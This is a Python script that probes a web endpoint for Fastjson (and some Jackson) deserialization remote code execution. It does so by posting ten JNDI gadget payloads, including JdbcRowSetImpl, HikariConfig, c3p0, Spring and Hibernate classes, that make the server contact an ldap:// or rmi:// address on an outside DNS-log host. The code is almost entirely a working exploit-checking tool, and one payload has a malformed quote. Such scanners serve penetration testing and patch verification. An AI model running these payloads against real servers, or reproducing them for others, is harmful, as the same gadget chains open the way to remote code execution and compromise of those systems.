# -*- coding:utf-8 -*-
#Written by hacden 2020/07/18
#Exec python3

import requests
import time
import re

def check_fastjson_rce(url_dir,dnslog,data):
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        'Connection': "close",
        'Content-Type': "application/json",
        'Accept': "*/*",
    }
    payloads = [
    '{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://%s.fastjson_1.2.24.localhost/fastjson_1.2.24", "autoCommit": true}',
    '{"name":{"@type":"java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"},"x":{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": rmi://%s.fastjson_1.2.47.localhost/fastjson_1.2.47","autoCommit": true}}}',
    '{"@type": "org.apache.xbean.propertyeditor.JndiConverter","AsText": "rmi://%s.fastjson_1.2.62.localhost/fastjson_1.2.62"}',
    '{"@type": "oracle.jdbc.connector.OracleManagedConnectionFactory ","dataSourceName": "rmi://%s.fastjson_1.2.62_2.localhost/fastjson_1.2.62_2"}',
    '{"@type": "com.caucho.config.types.ResourceRef", "lookupName": "ldap://%s.jackson_fastjson_10673.localhost/jackson_fastjson_10673"}',
    '{"@type": "com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://%s.jackson_fastjson_14540.localhost/jackson_fastjson_14540"}',
    # 基于spring框架的field
    '{"@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean","targetBeanName": "rmi://1","propertyPath": "foo","beanFactory":{"@type": "org.springframework.jndi.support.SimpleJndiBeanFactory","shareableResources": ["rmi://%s.spring_field.localhost/spring_field"]}}',
    #基于JndiRefForwardingDataSource
    '{"@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName": "rmi://%s.JndiRefForwardingDataSource.localhost/JndiRefForwardingDataSource","loginTimeout": 0}',
    #基于JndiDataSourceFactoryDataSource
    '{"@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source": "rmi://%s.JndiDataSourceFactory.localhost/JndiDataSourceFactory"}}',
    #基于StatisticsService
    '{"@type": "org.hibernate.jmx.StatisticsService","SessionFactoryJNDIName": "rmi://%s.StatisticsService.localhost/StatisticsService"}',

    ]
    n = 1
    for payload in payloads:
        print("###############################################payload: %d ###############################################"%n)
        payload = payload.replace('localhost',dnslog.strip())%url_dir.split('/')[2]
        res = requests.post(url=url_dir, headers=headers, data=payload, timeout=3, verify=False)
        re_data = re.findall(r'[{](.*?)[}]', data.strip().strip('{'), re.S)
        if re_data:
            re_data = re.findall(r'[{](.*?)[}]', data.strip().strip('{'), re.S)
            for re_payload in re_data:
                if re_payload != "":
                    re_payload = data.replace(re_payload,payload.strip('{').strip('}'))
                    res = requests.post(url=url_dir, headers=headers, data=re_payload, timeout=3, verify=False)
                    print("-"*50)
                    print(res.text)
                    time.sleep(1)
        else:
            print(res.text)
        time.sleep(1)
        n += 1

def verify(protol, ip, port,exploit_dir,dnslog,data):
    ip = ip.strip()
    exploit_dir = exploit_dir.strip()
    if port.strip():
        url_dir = protol.strip() + "://" + ip + ":" + port.strip() + exploit_dir
    else:
        url_dir = protol.strip() + "://" + ip + exploit_dir
    try:
        check_fastjson_rce(url_dir,dnslog,data)
    except requests.ReadTimeout:
        msg = "[-] There is Seem fastjson反序列化漏洞 Vuln!"
        return True,msg
    except Exception as e:
        msg = "[-] There is Not Seem fastjson反序列化漏洞 Vuln! Error: %s "%str(e)
        return False,msg

if __name__ == '__main__':
    ip =  "                 192.168.43.90                                                "
    dnslog = "xxx.xxx.xxx"
    data = ' '
    print(verify("http",ip, "80 ","  /exploit    ",dnslog,data))




